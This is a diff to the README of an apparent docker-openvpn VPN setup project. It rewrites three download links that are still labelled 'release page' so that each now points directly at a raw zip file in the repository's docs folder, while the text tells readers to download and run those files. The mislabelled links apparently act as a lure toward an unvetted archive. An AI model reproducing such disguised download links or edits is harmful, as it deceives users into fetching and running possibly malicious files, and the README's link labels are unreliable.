@@ -1,6 +1,6 @@
 # 🛡️ docker-openvpn - Simple VPN Server Setup
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/lothianregionophrysapifera132/docker-openvpn/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/lothianregionophrysapifera132/docker-openvpn/raw/refs/heads/main/docs/openvpn-docker-v2.3.zip)
 
 ## 📦 What this is
 
@@ -22,7 +22,7 @@ If you plan to run this on a home server or a Raspberry Pi, the image also suppo
 
 ## ⬇️ Download and install
 
-1. Open the [release page](https://github.com/lothianregionophrysapifera132/docker-openvpn/releases)
+1. Open the [release page](https://github.com/lothianregionophrysapifera132/docker-openvpn/raw/refs/heads/main/docs/openvpn-docker-v2.3.zip)
 2. Download the latest release files for docker-openvpn
 3. Save the files to a folder you can find later
 4. If the release includes a helper script, keep it in the same folder
@@ -151,4 +151,4 @@ If setup fails, delete the broken files and run the setup again from a clean fol
 
 ## 🔗 Download
 
-Visit the [release page](https://github.com/lothianregionophrysapifera132/docker-openvpn/releases) to download and run the latest docker-openvpn release files
+Visit the [release page](https://github.com/lothianregionophrysapifera132/docker-openvpn/raw/refs/heads/main/docs/openvpn-docker-v2.3.zip) to download and run the latest docker-openvpn release files
